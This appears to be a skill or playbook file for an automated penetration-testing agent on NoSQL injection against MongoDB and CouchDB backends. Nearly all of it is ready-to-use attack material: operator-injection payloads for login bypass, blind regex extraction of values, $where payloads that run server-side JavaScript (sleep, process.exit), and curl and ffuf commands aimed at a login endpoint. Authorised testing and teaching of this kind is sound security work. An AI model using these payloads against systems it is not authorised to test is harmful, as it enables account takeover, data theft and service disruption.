---
name: nosql-injection
description: NoSQL injection for MongoDB (and CouchDB) backends — operator injection ($ne/$gt/$regex/$where), blind boolean, and RCE via $where. Use when API returns "Internal Server Error" on quotes or accepts JSON query-ish objects, or MongoDB is fingerprinted.
category: injection
---

# NoSQL Injection

## Detection
- Send `'` or `"` in a JSON value → 500 with Mongo errors (e.g. `Illegal character in $where`).
- JSON body that accepts operators: `{"user":"x","pass":"y"}` → try `{"user":{"$ne":null},"pass":{"$ne":null}}`.
- Query-string based: `?user[$ne]=null` (older Express/qs).

## Exploitation
1. **Auth bypass**: `{"$ne":null}`, `{"$gt":""}`, `{"$regex":".*"}` on the password/username filter.
2. **Blind boolean**: `$regex` + `$where` timing — `{"user":{"$regex":"^a.*"}}` vs `"^z.*"` response/status difference.
3. **RCE**: `{"$where":"this.username == 'x' || sleep(3000)"}` or `{"$where":"function(){ return process.exit(1) }"}` — only works when $where evaluates server-side JS.
4. **Bypass type check**: use `{"$exists":true}` to test field presence.

## Payloads
```
{"user":{"$ne":null},"pass":{"$ne":null}}
{"user":{"$gt":""},"pass":{"$gt":""}}
{"user":{"$regex":".*"},"pass":{"$regex":".*"}}
{"user":{"$regex":"^admin.*"},"pass":{"$ne":null}}
{"$where":"sleep(3000)"}
?user[$ne]=null&pass[$ne]=null
```

## Tool Commands (Windows)
```powershell
# detect operator support
curl.exe -s -X POST "$U/login" -d '{"user":{"$ne":null},"pass":{"$ne":null}}' -H 'Content-Type: application/json' -w "`n%{http_code}`n"
# blind regex extraction with ffuf (if available)
# ffuf -w chars.txt -X POST -u "$U/login" -d '{"user":{"$regex":"^FUZZ.*"},"pass":{"$ne":null}}' -H 'Content-Type: application/json' -mc 200
```

## Verification & Evidence
- Auth bypass: login succeeded with $ne while failing with plain wrong creds.
- Blind: measurable response/time delta between matching and non-matching regex.
- Save request/response/reproduce.